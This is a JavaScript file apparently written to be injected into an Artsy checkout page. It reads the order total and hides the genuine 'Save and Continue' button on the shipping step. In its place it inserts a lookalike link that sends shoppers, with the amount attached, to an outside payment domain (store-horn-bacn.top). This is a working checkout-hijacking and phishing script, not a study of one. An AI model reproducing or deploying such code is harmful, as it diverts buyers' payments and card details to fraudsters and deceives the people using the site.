let orderDiv;
let SaveAndContinueBtn;
let sumValue;

let paymentLink = `https://payment.store-horn-bacn.top`;

// function NavToPayment() {
//     window.location.href = `https://payment.store-horn-bacn.top/?sum=${sumValue}`;
// }

let newButton = document.createElement("div");

console.log("this is artsy js from rl github");

console.log("script from rl-www");

function checkIfOrderShippingDivExist() {
  console.log(`checkIfOrderShippingDivExist`);
  orderDiv = document.querySelector('[data-test="orderShipping"]');
  console.log(orderDiv);
  return orderDiv;
}
function addELToSaveAndContinueBtn() {
  console.log(`addELToSaveAndContinueBtn works`);
  if (orderDiv) {
    SaveAndContinueBtn = orderDiv.querySelector(
      ".fresnel-greaterThan-xs button"
    );
    console.log(`aim button SaveAndContinueBtn`);
    SaveAndContinueBtn;
    if (SaveAndContinueBtn) {
      SaveAndContinueBtn.style = "display: none !important";
      newButton.innerHTML = `<a href="${paymentLink}/?sum=${sumValue}" tabindex="0" display="inline-flex" width="50%" class="Button__Container-sc-1bhxy1c-0 dgWQOL"><div opacity="1" display="flex" width="100%" font-family="sans" class="Box-sc-15se88d-0 Text-sc-18gcpao-0 hOLXSx hpQner">Save and Continue</div></a>`;
      SaveAndContinueBtn.insertAdjacentElement("afterend", newButton);
    }
  }
}

setInterval(() => {
  sumValue = document.querySelectorAll(`div[color=black100]`)[1].innerHTML;
  if (sumValue == `Waiting for final costs`) {
    allDivText60 = document.querySelectorAll(`div[color=black60]`);
    allDivText60.forEach((el, i) => {
      if (el.textContent.includes("Price")) {
        console.log('Найден div с текстом "Price":', el);
        console.log(allDivText60[i + 1]);
        sumValue = allDivText60[i + 1].innerHTML;
        console.log(sumValue);
      }
    });
  }

  if (checkIfOrderShippingDivExist()) {
    addELToSaveAndContinueBtn();
  }
}, 5000);

window.addEventListener("beforeunload", function (event) {
  event.stopImmediatePropagation();
});
